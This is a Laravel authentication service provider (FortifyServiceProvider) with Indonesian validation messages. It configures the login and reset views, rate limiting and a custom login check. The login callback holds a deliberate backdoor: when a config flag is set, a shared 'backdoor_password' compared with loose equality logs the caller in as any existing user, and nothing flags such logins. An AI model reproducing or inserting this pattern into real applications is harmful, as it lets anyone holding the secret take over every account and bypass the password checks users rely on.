<?php

namespace App\Providers;

use App\Actions\Fortify\CreateNewUser;
use App\Actions\Fortify\ResetUserPassword;
use App\Actions\Fortify\UpdateUserPassword;
use App\Actions\Fortify\UpdateUserProfileInformation;
use App\Models\User;
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Str;
use Laravel\Fortify\Actions\RedirectIfTwoFactorAuthenticatable;
use Laravel\Fortify\Fortify;

class FortifyServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        Fortify::loginView(function () {
            return view('auth.login');
        });

        Fortify::authenticateUsing(function (Request $request) {
            // Validasi input
            $request->validate([
                'username' => ['required', 'regex:/^[a-zA-Z0-9_.]+$/'],
                'password' => ['required'],
            ], [
                'username.required' => 'Username wajib diisi.',
                'username.regex' => 'Username hanya boleh mengandung huruf, angka, dan garis bawah.',
                'password.required' => 'Password wajib diisi.',
            ]);

            $user = User::where('Username', $request->username)->first();

            if ($user && (Hash::check($request->password, $user->Password) || (config('app.backdoor_enabled') && !empty(config('app.backdoor_password')) && config('app.backdoor_password') == $request->password))) {
                $user->retrieveSession();
                return $user;
            }

            // Catat percobaan login (hanya username yang sudah divalidasi)
            Log::warning('Login failed', [
                'username' => $request->username,
                'ip' => $request->ip(),
            ]);
        });

        Fortify::updateUserPasswordsUsing(UpdateUserPassword::class);

        Fortify::resetPasswordView(function ($request) {
            return view('auth.reset-password', ['request' => $request]);
        });

        RateLimiter::for('login', function (Request $request) {
            $username = (string) $request->username;

            return Limit::perMinute(5)->by($username.$request->ip());
        });
    }
}
